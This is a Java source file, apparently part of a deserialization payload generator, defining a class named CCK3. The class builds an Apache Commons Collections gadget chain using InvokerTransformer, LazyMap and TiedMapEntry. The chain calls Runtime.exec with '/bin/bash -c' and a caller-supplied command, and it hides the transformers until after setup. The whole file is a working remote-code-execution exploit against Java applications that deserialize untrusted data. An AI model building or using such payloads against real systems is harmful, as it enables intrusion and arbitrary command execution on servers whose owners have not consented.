package gadget;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.CommonUtil;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * name: cck3
 */
public class CCK3 implements ObjectPayload {
    @Override
    public Object getObjectPayload(String command) {
        final String[] execArgs = new String[]{"/bin/bash", "-c", command};

        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String[].class}, execArgs),
                new ConstantTransformer(new HashSet<String>())};
        ChainedTransformer inertChain = new ChainedTransformer(new Transformer[]{});

        HashMap<String, String> innerMap = new HashMap();
        Map m = LazyMap.decorate(innerMap, inertChain);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, "v");
        outerMap.put(tied, "t");
        innerMap.clear();

        CommonUtil.setFieldValue(inertChain, "iTransformers", transformers);
        return outerMap;
    }
}
